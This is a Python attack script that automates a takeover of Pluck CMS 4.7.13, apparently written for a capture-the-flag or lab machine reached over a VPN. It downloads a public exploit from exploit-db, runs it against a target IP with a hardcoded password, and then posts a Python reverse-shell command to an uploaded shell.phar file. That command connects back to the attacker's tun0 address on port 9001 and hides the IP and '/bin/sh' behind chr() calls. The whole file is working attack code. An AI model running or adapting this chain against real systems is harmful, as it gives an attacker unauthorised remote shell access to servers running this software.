#!/bin/python
import argparse
import os
import re
import subprocess
import sys

import requests


def curl_exploit(file_name: str):
    exploit_url = "https://www.exploit-db.com/download/49909"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    result = requests.get(exploit_url, headers=headers)
    if result.status_code != 200:
        raise requests.exceptions.HTTPError("Check the internet")
    with open(file_name, "w") as f:
        f.write(result.text)


def run_exploit(target_ip: str, file_name: str, port: str = ""):
    args = ["python3", file_name, target_ip, port, "password", "/app/pluck-4.7.13"]
    process = subprocess.run(args, capture_output=True, text=True, check=False)
    error = process.stderr
    if len(error) != 0:
        raise subprocess.CalledProcessError(returncode=process.returncode, cmd=args)


def create_session(ip) -> requests.Session:
    session = requests.Session()
    url = f"http://{ip}/app/pluck-4.7.13/login.php"
    payload = {
        "cont1": "password",
        "bogus": "",
        "submit": "Log in",  # '+' decodes to a space
    }
    res = session.post(url=url, data=payload)
    if res.status_code != 200:
        raise requests.exceptions.HTTPError(
            "Session could not be created.\n1. Check for internet connection\n2.Check if the IP are correct"
        )
    return session


def create_payload(ip: str) -> dict:
    split_ip = ip.split(".")
    body = {
        "cmd": f"python3 -c 'import os,socket,pty;s=socket.socket();s.connect((str({split_ip[0]})+chr(46)+str({split_ip[1]})+chr(46)+str({split_ip[2]})+chr(46)+str({split_ip[3]}),9001));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(115)+chr(104))'",
        "cwd": "/",
    }
    return body


def create_revshell(ip: str, session: requests.Session, body: dict, port: str = ""):
    url = f"http://{ip}:{port}/app/pluck-4.7.13/files/shell.phar?feature=shell"
    res = session.post(url, data=body)
    if res.status_code != 200:
        raise requests.exceptions.HTTPError(
            "Session could not be created.\n1. Check for internet connection\n2.Check if the IP are correct"
        )


def clean_up(file_name: str):
    os.remove(file_name)


def get_tun0() -> str:
    process = subprocess.run("ifconfig", capture_output=True, text=True, check=False)
    ifconfig_output = process.stdout

    # Extract the IPv4 address specifically following 'tun0' and 'inet'
    match = re.search(
        r"tun0:.*?\binet\s+([0-9]{1,3}(?:\.[0-9]{1,3}){3})",
        ifconfig_output,
        re.DOTALL,
    )

    tun0_ip = match.group(1) if match else None
    if tun0_ip is None:
        raise ValueError("Interface 'tun0' not found. Ensure VPN/tunnel is active.")
    return str(tun0_ip)


def main():
    try:
        parser = argparse.ArgumentParser(description="Script argument parser")
        parser.add_argument(
            "-t",
            "--ip",
            type=str,
            help="Target IP address",
        )
        parser.add_argument("-p", "--port", type=str, default="", help="Target port")
        parser.add_argument(
            "-H",
            "--home_ip",
            type=str,
            default=get_tun0(),
            help="Home IP address (default: tun0)",
        )
        args = parser.parse_args()
        ip = args.ip
        port = args.port
        home_ip = args.home_ip
        file_name = "exploit.py"
        curl_exploit(file_name)
        run_exploit(target_ip=ip, file_name=file_name, port=port)
        clean_up(file_name)
        session = create_session(ip)
        payload = create_payload(home_ip)
        create_revshell(ip, session, payload, port=port)
    except (requests.exceptions.HTTPError, ValueError) as e:
        print(e)
        sys.exit(0)
    except subprocess.CalledProcessError as e:
        print(f"{e.cmd}: {e.stderr}")
        sys.exit(e.returncode)

if __name__ == "__main__":
    main()
